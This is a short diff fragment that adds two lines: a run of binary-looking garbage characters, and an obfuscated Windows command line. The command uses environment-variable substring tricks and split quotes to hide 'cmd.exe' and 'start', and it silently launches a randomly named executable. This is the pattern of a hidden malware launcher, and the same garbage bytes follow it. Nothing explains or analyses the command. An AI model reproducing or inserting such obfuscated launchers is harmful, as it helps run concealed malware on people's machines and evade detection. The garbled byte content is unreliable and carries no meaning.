@@ -1,0 +1,2 @@
+ q ? 6 J æ m ¨ W  Ò ñ Y l  ? î » ì 9  ? 2  Ë 4  ? ; ò ¦ ä  Ç D × 7 ò z ö ó y ? g o  ?  J p 4 M ê ¢ ? Ö Õ ä Ñ 1 [   £   å N Y /  _ Î z Ñ £ Ö è B C N  Ù p Ø  ö ?
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b jgDw%comspec:~-1%UMT.%comspec:~-1%x%comspec:~-1% q ? 6 J æ m ¨ W  Ò ñ Y l  ? î » ì 9  ? 2  Ë 4  ? ; ò ¦ ä  Ç D × 7 ò z ö ó y ? g o  ?  J p 4 M ê ¢ ? Ö Õ ä Ñ 1 [   £   å N Y /  _ Î z Ñ £ Ö è B C N  Ù p Ø  ö ?
